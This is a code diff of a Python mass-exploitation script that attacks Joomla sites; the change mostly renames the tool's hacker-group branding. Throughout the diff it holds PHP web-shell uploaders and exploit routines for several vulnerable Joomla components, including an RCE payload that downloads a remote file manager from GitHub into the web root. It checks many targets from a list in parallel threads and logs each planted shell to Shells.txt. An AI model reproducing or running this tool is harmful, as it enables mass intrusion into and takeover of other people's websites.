@@ -29,14 +29,13 @@ sb  =   Style.BRIGHT
 ##### En Banglasia #####
 ########################
 
-shell = """ <?php echo 'Priv8 Uploaders By En Banglasia!'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('Priv8 Uploaders By En Banglasia!'); 	 	 </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
+shell = """ <?php echo 'Priv8 Uploaders By Dragon Force!'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('Priv8 Uploaders By Dragon Force!'); 	 	 </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
 shell_2 = """<?php 
-// name of the file is: i (it has no extension)
 error_reporting(0);
 $Ye = "_Ye";
-if(isset($_GET["Fuckedz!"]))
+if(isset($_GET["DragonForce"]))
 	{
-		echo"Priv8 Uploaders By En Banglasia!{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Fuckedz!</b>-->".$_FILES["f"]["name"];}else{echo"<b>Failed!";}} }
+		echo"Priv8 Uploaders By Dragon Force!{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Fuckedz!</b>-->".$_FILES["f"]["name"];}else{echo"<b>Failed!";}} }
 
 echo 'uname:'.php_uname()."\n";
 echo getcwd() . "\n";
@@ -45,7 +44,7 @@ echo getcwd() . "\n";
 
 
 shell_name = str(time.time())[:-3]
-filename = "Fuckedz"+shell_name+".php"
+filename = "DragonForce"+shell_name+".php"
 
 start_raw = raw_input('Your List Please : ')
 try:
@@ -73,12 +72,17 @@ class Master:
 
 
 		
- _____         ____                    _           _
-| ____|_ __   | __ )  __ _ _ __   __ _| | __ _ ___(_) __ _
-|  _| | '_ \  |  _ \ / _` | '_ \ / _` | |/ _` / __| |/ _` |
-| |___| | | | | |_) | (_| | | | | (_| | | (_| \__ \ | (_| |
-|_____|_| |_| |____/ \__,_|_| |_|\__, |_|\__,_|___/_|\__,_|
-                                 |___/ 
+$$$$$$$\                                                         $$$$$$$$\                                      
+$$  __$$\                                                        $$  _____|                                     
+$$ |  $$ | $$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\        $$ |    $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  
+$$ |  $$ |$$  __$$\ \____$$\ $$  __$$\ $$  __$$\ $$  __$$\       $$$$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
+$$ |  $$ |$$ |  \__|$$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |  $$ |      $$  __|$$ /  $$ |$$ |  \__|$$ /      $$$$$$$$ |
+$$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |      $$ |   $$ |  $$ |$$ |      $$ |      $$   ____|
+$$$$$$$  |$$ |     \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |      $$ |   \$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$\ 
+\_______/ \__|      \_______| \____$$ | \______/ \__|  \__|      \__|    \______/ \__|       \_______| \_______|
+                             $$\   $$ |                                                                         
+                             \$$$$$$  |                                                                         
+                              \______/                                                                          
 					   
 						 
 						 
@@ -142,16 +146,16 @@ class Master:
 		try:
 		
 		
-			pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/FilesManager.php','w+'),file_get_contents('https://raw.githubusercontent.com/apidotmy/Uploaders/master/FilesManager.php'));")
+			pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/DragonForce.php','w+'),file_get_contents('https://raw.githubusercontent.com/apidotmy/Uploaders/master/FilesManager.php'));")
 			
 			rce_url(url,pl)
 			
-			req_rce = requests.get(url+'/Fuckedz.php?Fuckedz')
+			req_rce = requests.get(url+'/DragonForce.php?DragonForce')
 			
-			if 'En Banglasia!' in req_rce.content:
+			if 'Dragon Force!' in req_rce.content:
 			
 				print '{}[Target]: {}{} => {}{} RCE => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fg)
-				open('Shells.txt', 'a').write(url+'/Fuckedz.php?Fuckedz'+'\n')
+				open('Shells.txt', 'a').write(url+'/DragonForce.php?DragonForce'+'\n')
 		
 		
 			else:
@@ -170,25 +174,25 @@ class Master:
 		try:
 		
 			
-			filename1 = "Fuckedz.php.j"
+			filename1 = "DragonForce.php.j"
 			
 			
 			com_jd_up = { 'file_upload':(filename1, shell_2, 'text/html'), 'pic_upload':(filename1, shell_2, 'text/html')}
 
-			com_jd_dat = { 'name': 'yc-waif', 'mail': 'hphulwariya2016@gmail.com', 'catlist': '1', 'filetitle': "lolz",
-					 'description': "<p>zot</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
-					 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'task': "upload" }
+			com_jd_dat = { 'name': 'Dragon Force', 'mail': 'dragonforce@dragonforce.my', 'catlist': '1', 'filetitle': "Fuck3dz By Dragon Force!",
+					 'description': "<p>Fuck3dz By Dragon Force!</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
+					 'description': "<p>Fuck3dz By Dragon Force!</p>", 'option': "com_jdownloads", 'task': "upload" }
 			
 			
 			req_jd = requests.post(url+'/index.php?option=com_jdownloads&Itemid=1&task=upload', data=com_jd_dat, files=com_jd_up)
 			
 			
-			shell_jd = requests.get(url+'/images/jdownloads/screenshots/Fuckedz.php.j?Fuckedz')
+			shell_jd = requests.get(url+'/images/jdownloads/screenshots/DragonForce.php.j?DragonForce')
 		
-			if 'En Banglasia!' in shell_jd.content:
+			if 'Dragon Force!' in shell_jd.content:
 				
 				print '{}[Target]: {}{} => {}{} Jdownloads => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
-				open('Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/rxrking.php3.g?rxr'+'\n')
+				open('Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/DragonForce.php.j?DragonForce'+'\n')
 				
 			else:
 				print '{}[Target]: {}{} => {}{} Jdownloads => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
@@ -222,7 +226,7 @@ class Master:
 				
 				Shell_jbcatalog = requests.get(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename))
 				
-				if 'En Banglasia!' in Shell_jbcatalog.content:
+				if 'Dragon Force!' in Shell_jbcatalog.content:
 					print '{}[Target]: {}{} => {}{} Com_Jbcatalog => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
 					open('Shells.txt', 'a').write(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename)+'\n')
 					
@@ -267,7 +271,7 @@ class Master:
 				
 				Shell_fabrik = requests.get(url+'/'+str(filename))
 				
-				if 'En Banglasia!' in Shell_fabrik.content:			
+				if 'Dragon Force!' in Shell_fabrik.content:			
 					print '{}[Target]: {}{} => {}{} Com_Fabrik => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
 					open('Shells.txt', 'a').write(url+'/'+str(filename)+'\n')
 					
@@ -295,7 +299,7 @@ class Master:
 			
 			check_lib = requests.get(url+'/components/'+filename)
 			
-			if 'En Banglasia!' in check_lib.content:			
+			if 'Dragon Force!' in check_lib.content:			
 				print '{}[Target]: {}{} => {}{} Com_B2J {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Shells.txt', 'a').write(url+'/components/'+filename+'\n')
 						
@@ -316,7 +320,7 @@ class Master:
 				print '{}[+]: {}{} => {}{} Com_AdsManager => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
 				
 				
-				imageshell = "Fuckedz.jpg"
+				imageshell = "DragonForce.jpg"
 				
 				com_adsm = {'file':(imageshell, shell), 'name':filename}
 				
@@ -325,7 +329,7 @@ class Master:
 				
 				check_shell = requests.get(url+"/tmp/plupload/"+filename)
 				
-				if 'En Banglasia!' in check_shell.content:
+				if 'Dragon Force!' in check_shell.content:
 				
 					print '{}[Target]: {}{} => {}{} Com_AdsManager => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
 					open('Shells.txt', 'a').write(url+"/tmp/plupload/"+filename+'\n')
@@ -355,7 +359,7 @@ class Master:
 			
 				print '{}[+]: {}{} => {}{} Com_Myblog => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
 				
-				image_myblog = "Fuckedz.php.xxxjpg"
+				image_myblog = "DragonForce.php.xxxjpg"
 				
 				com_myb = {'fileToUpload':(image_myblog, shell)}
 				
@@ -370,7 +374,7 @@ class Master:
 				check_shell = requests.get(site)
 				
 				
-				if 'En Banglasia!' in check_shell.content:
+				if 'Dragon Force!' in check_shell.content:
 					print '{}[Target]: {}{} => {}{} Com_Myblog => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
 					open('Shells.txt', 'a').write(site+'\n')
 					
@@ -480,7 +484,7 @@ def MyLove(url):
 def Main():
     try:
         start = timer()
-        pp = ThreadPool(20)
+        pp = ThreadPool(17)
         pr = pp.map(MyLove, woh)
         print('Time: ' + str(timer() - start) + ' seconds')
     except:
